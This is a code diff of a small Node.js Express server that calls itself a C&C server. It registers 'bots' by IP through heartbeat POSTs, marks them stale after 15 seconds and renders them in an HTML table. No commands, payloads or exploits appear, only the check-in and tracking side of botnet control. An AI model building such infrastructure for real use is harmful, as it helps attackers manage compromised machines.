@@ -22,29 +22,6 @@ app.get('/', function (req, res) {
   res.end();
 });
 
-//When we get a post request to /new, we know one of our bots is contacting us
-app.post('/new', function(req, res) {
-	var bot = {
-		ip: req.ip, //This is based off of what WE see when the bot contacts us
-		online: true, //We can assume this
-		status: req.body.status, //This is part of the post that they send us
-		lastHeartbeat: Date().toLocaleString()
-	};
-	handleNew(bot);
-	res.send("pong");
-});
-
-//Our bots will intermittently send heartbeats so we know they're online still, and update their status
-app.post('/heartbeat', function(req, res) {
-	//Look through known bots and update their status based on IP
-	for (var i = 0; i < bots.length; i++) {
-		if (bots[i].ip == req.ip) {
-			bots[i].status = req.body.status;
-		}
-	}
-	res.send("pong");
-});
-
 //This might not actually be a new bot, it could have just restarted, so let's handle that
 function handleNew(newBot) {
 	var found = false;
@@ -58,7 +35,60 @@ function handleNew(newBot) {
 	}
 }
 
-//Table generation using some helper functions
+//Our bots will intermittently send heartbeats so we know they're online still, and update their status
+app.post('/heartbeat', function(req, res) {
+	//Look through known bots and update their status based on IP
+	var foundInBots = false;
+	for (var i = 0; i < bots.length; i++) {
+		if (bots[i].ip == req.ip) {
+			console.warn("Received heartbeat from  " + req.ip);
+			bots[i].status = req.body.status;
+			if (!bots[i].online) {
+				console.warn(bots[i].ip + " is no longer stale, set as online")
+				bots[i].online = true;
+			}
+			foundInBots = true;
+			bots[i].lastHeartbeat = Date().toLocaleString();
+		}
+	}
+	if (!foundInBots) {
+		var bot = {
+			ip: req.ip, //This is based off of what WE see when the bot contacts us
+			online: true, //We can assume this
+			status: req.body.status, //This is part of the post that they send us
+			lastHeartbeat: Date().toLocaleString()
+		};
+		handleNew(bot);
+		res.send("Added");
+		console.log("New bot added from " + req.ip);
+	} else {
+		res.send("pong");
+		
+	}
+});
+
+//Check every 10s to make sure our bots are up to date
+setInterval(function() {
+	for (var i = 0; i < bots.length; i++) {
+		var calc = (Date.now() - Date.parse(bots[i].lastHeartbeat)) / 1000; //Time in seconds since last heartbeat
+		if (calc > 15 && bots[i].online == true) {
+			bots[i].online = false;
+			console.warn(bots[i].ip + " has gone stale, set as offline");
+		} else if (calc < 15) {
+			bots[i].online = true;
+		}
+	}
+}, 10000);
+
+
+
+
+//Start the server
+app.listen(3000, function () {
+  	console.log('C&C Server Online, waiting for bots');
+});
+
+//Templates and table gens
 function genTable() {
 	var tableHTML = headerTable;
 	for (var i = 0; i < bots.length; i++) {
@@ -68,21 +98,16 @@ function genTable() {
 	return tableHTML;
 }
 
-//Start the server
-app.listen(3000, function () {
-  	console.log('C&C Server Online, waiting for bots');
-});
-
-//Templates and table gens
 var headerTable = `
 <table border="1">
   <tr>
     <th>IP</th>
     <th>Online</th>
-    <th>Status</th>
+    <th>Last Status</th>
     <th>Last Heartbeat</th>
   </tr>
 `;
+
 function tableContentGen(ip, online, status, lhb) {
 	return ` 
 	<tr>
@@ -92,4 +117,5 @@ function tableContentGen(ip, online, status, lhb) {
     <td>${lhb}</td>
   </tr>`
 }
+
 var footerTable = "</table>";
